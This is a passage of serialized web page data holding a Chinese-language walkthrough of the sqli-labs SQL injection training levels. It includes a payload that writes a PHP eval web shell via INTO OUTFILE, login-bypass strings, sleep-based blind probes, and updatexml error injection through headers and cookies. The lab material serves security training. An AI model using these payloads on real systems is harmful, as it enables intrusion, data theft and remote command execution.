hello\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"1   2   hello\"}}]}]]}]]}]]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"写入一个木马（需要知道\u003ccode class=\\\"x-inline-highlight\\\"\u003eWWW\u003c/code\u003e的路径）：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"root = r\\\"C:\\\\\\\\path\\\\\\\\to\\\\\\\\WWW\\\\\\\\sqli-labs\\\\\\\\Less-7\\\\\\\\\\\"\\n\\nshell = '\u003c?php @eval($_GET[\\\"cmd\\\"]); ?\u003e'\\nshell_hex = \\\"0x\\\" + shell.encode().hex()\\nshell_path = root + \\\"shell.php\\\"\\n\\npayload = f\\\"?id=x')) UNION SELECT '','',{shell_hex} INTO OUTFILE '{shell_path}' -- \\\"\\nprint(payload)\\n# ?id=x')) UNION SELECT '','',0x3c3f70687020406576616c28245f4745545b22636d64225d293b203f3e INTO OUTFILE '...' --\\n\\nquery_get(\\\"Less-7\\\", payload)\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$20\"}}]}]]}],[\"$\",\"$L17\",null,{\"src\":\"L7.jpg\",\"width\":\"100%\"}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"登陆框：L11-L16\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"前言 \u0026 笔记\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这几个Lab是通过登陆框进行SQL注入，这里以成功绕过登陆作为通关条件。\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L11\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x' OR 1=1 -- \\\"\\nresp = query_post(\\\"Less-11\\\", data={\\\"uname\\\": payload, \\\"passwd\\\": \\\"x\\\"})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x' OR 1=1 -- \\\"\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Less-11\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"uname\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"passwd\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L12\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = 'x\\\") OR 1=1 -- '\\nresp = query_post(\\\"Less-12\\\", data={\\\"uname\\\": payload, \\\"passwd\\\": \\\"x\\\"})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'x\\\") OR 1=1 -- '\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Less-12\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"uname\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"passwd\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L13\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x') OR 1=1 -- \\\"\\nresp = query_post(\\\"Less-13\\\", data={\\\"uname\\\": payload, \\\"passwd\\\": \\\"x\\\"})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x') OR 1=1 -- \\\"\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Less-13\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"uname\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"passwd\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L14\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = 'x\\\" OR 1=1 -- '\\nresp = query_post(\\\"Less-14\\\", data={\\\"uname\\\": payload, \\\"passwd\\\": \\\"x\\\"})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'x\\\" OR 1=1 -- '\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Less-14\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"uname\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"passwd\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L15\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"L15关闭了报错回显，因此不能直接得到闭合方式，考虑使用时间盲注探测：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"from query import *\\nimport requests\\n\\npayloads = [\\n    'x\\\"   OR sleep(10) -- ',\\n    'x\\\")  OR sleep(10) -- ',\\n    'x\\\")) OR sleep(10) -- ',\\n    \\\"x'   OR sleep(10) -- \\\",\\n    \\\"x')  OR sleep(10) -- \\\",\\n    \\\"x')) OR sleep(10) -- \\\",\\n]\\n\\nfor payload in payloads:\\n    try:\\n        query_post(\\\"Less-15\\\", data={\\\"uname\\\": payload, \\\"passwd\\\": \\\"x\\\"}, timeout=3)\\n    except requests.exceptions.Timeout:\\n        print(\\\"[*] Vulnerable payload:\\\", payload)\\n# [*] Vulnerable payload: x'   OR sleep(10) --\\n\\npayload = \\\"x' OR 1=1 -- \\\"\\nresp = query_post(\\\"Less-15\\\", data={\\\"uname\\\": payload, \\\"passwd\\\": \\\"x\\\"})\\nprint(resp.text)\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$21\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L16\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"L16也关闭了报错回显，同样的时间盲注探测方式，闭合方式为\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\")\u003c/code\u003e。\"}}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"报错注入应用：L17-L22\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L17\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"L17需要输入一个已经存在的账户名才能进入后面的逻辑，这里使用\u003ccode class=\\\"x-inline-highlight\\\"\u003eadmin\u003c/code\u003e。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$update = \\\"UPDATE users SET password='$passwd' WHERE username='$row1'\\\";\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$update\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"UPDATE users SET password='\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$passwd\u003c/span\u003e\u003c/span\u003e' WHERE username='\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$row1\u003c/span\u003e\u003c/span\u003e'\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) -- \\\"\\nresp = query_post(\\\"Less-17\\\", data={\\\"uname\\\": \\\"admin\\\", \\\"passwd\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) -- \\\"\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Less-17\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"uname\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"admin\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"passwd\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"注意这关如果改掉了某个账户的密码，可能会影响后面的Lab。\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L18\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"L18需要一对正确的账密才能进入后面的逻辑，这里使用\u003ccode class=\\\"x-inline-highlight\\\"\u003eadmin:admin\u003c/code\u003e。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$uagent = $_SERVER['HTTP_USER_AGENT'];\\n// ...\\n$insert = \\\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$uagent\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'HTTP_USER_AGENT'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token comment\\\"\u003e// ...\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$insert\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$uagent\u003c/span\u003e\u003c/span\u003e', '\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$IP\u003c/span\u003e\u003c/span\u003e', \u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$uname\u003c/span\u003e\u003c/span\u003e)\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x', 0, updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #\\\"\\nresp = query_post(\\\"Less-18\\\", data={\\\"uname\\\": \\\"admin\\\", \\\"passwd\\\": \\\"admin\\\"}, headers={\\\"User-Agent\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$22\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003epayload\u003c/code\u003e通过\u003ccode class=\\\"x-inline-highlight\\\"\u003eUser-Agent\u003c/code\u003eHeader传入，发现在服务端解析时会删掉末尾的空格，而\u003ccode class=\\\"x-inline-highlight\\\"\u003e--\u003c/code\u003e注释符后面必须跟一个空格才能生效，因此这里使用\u003ccode class=\\\"x-inline-highlight\\\"\u003e#\u003c/code\u003e作为注释符。\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L19\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$referrer = $_SERVER['HTTP_REFERER'];\\n// ...\\n$insert = \\\"INSERT INTO `security`.`referers` (`referers`, `ip_address`) VALUES ('$referrer', '$IP')\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$referrer\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'HTTP_REFERER'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token comment\\\"\u003e// ...\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$insert\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"INSERT INTO `security`.`referers` (`referers`, `ip_address`) VALUES ('\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$referrer\u003c/span\u003e\u003c/span\u003e', '\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$IP\u003c/span\u003e\u003c/span\u003e')\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"注：作者原本写的是\u003ccode class=\\\"x-inline-highlight\\\"\u003e\u0026#36;uagent = \u0026#36;_SERVER['HTTP_REFERER'];\u003c/code\u003e，这里把变量名改过来了。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x', updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #\\\"\\nresp = query_post(\\\"Less-19\\\", data={\\\"uname\\\": \\\"admin\\\", \\\"passwd\\\": \\\"admin\\\"}, headers={\\\"Referer\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$23\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L20\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"从Cookie注入：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$cookee = $_COOKIE['uname'];\\n$sql = \\\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$cookee\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_COOKIE\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'uname'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users WHERE username='\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$cookee\u003c/span\u003e\u003c/span\u003e' LIMIT 0,1\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #\\\"\\nresp = query_post(\\\"Less-20\\\", data={\\\"uname\\\": \\\"admin\\\", \\\"passwd\\\": \\\"admin\\\"}, cookies={\\\"uname\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$24\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L21\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"同样是从Cookie注入，但是多了一层Base64。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$cookee = $_COOKIE['uname'];\\n$cookee = base64_decode($cookee);\\n$sql = \\\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$cookee\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_COOKIE\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'uname'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$cookee\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token function\\\"\u003ebase64_decode\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token variable\\\"\u003e$cookee\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users WHERE username=('\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$cookee\u003c/span\u003e\u003c/span\u003e') LIMIT 0,1\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x') OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #\\\"\\npayload = base64.b64encode(payload.encode()).decode()\\nresp = query_post(\\\"Less-21\\\", data={\\\"uname\\\": \\\"admin\\\", \\\"passwd\\\": \\\"admin\\\"}, cookies={\\\"uname\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$25\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L22\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"闭合方式为双引号。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$cookee = $_COOKIE['uname'];\\n$cookee = base64_decode($cookee);\\n$cookee1 = '\\\"' . $cookee . '\\\"';\\n$sql = \\\"SELECT * FROM users WHERE username=$cookee1 LIMIT 